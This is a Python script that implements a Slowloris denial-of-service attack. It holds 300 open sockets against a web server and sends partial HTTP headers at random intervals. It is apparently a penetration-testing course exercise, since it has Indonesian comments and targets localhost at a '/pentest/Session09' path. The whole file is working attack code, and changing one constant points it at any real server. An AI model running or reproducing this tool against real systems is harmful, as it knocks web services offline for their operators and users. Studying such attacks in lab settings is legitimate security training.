import socket
import random

TARGET = "127.0.0.1"
PORT = 80
COUNT = 300
SOCKET_LIST = []


def initialize_socket():
    # bikin socket
    s = socket.socket()
    # connect socket
    s.connect((TARGET, PORT))
    message = "GET /pentest/Session09/09/09-web/index.php HTTP/1.1"
    s.send(message.encode())
    return s


def main():
    try:
        print("Creatingsocket...")
        for _ in range(COUNT):
            # bikin object socket untuk DOS
            s = initialize_socket()
            SOCKET_LIST.append(s)
        # slow loris
        while True:
            for s in SOCKET_LIST:
                try:
                    message = f"X-request : {random.randint(0, 1000)}"
                    s.send(message.encode())

                except Exception:
                    s.close()
                    SOCKET_LIST.remove(s)
            # untuk pastiin 300 socketnya terbuat
            #selisih = COUNT - len(SOCKET_LIST)
            for _ in range(COUNT - len(SOCKET_LIST)):
                s = initialize_socket()
                SOCKET_LIST.append(s)

    except KeyboardInterrupt:
        for s in SOCKET_LIST:
            s.close()


if __name__ == "__main__":
    main()
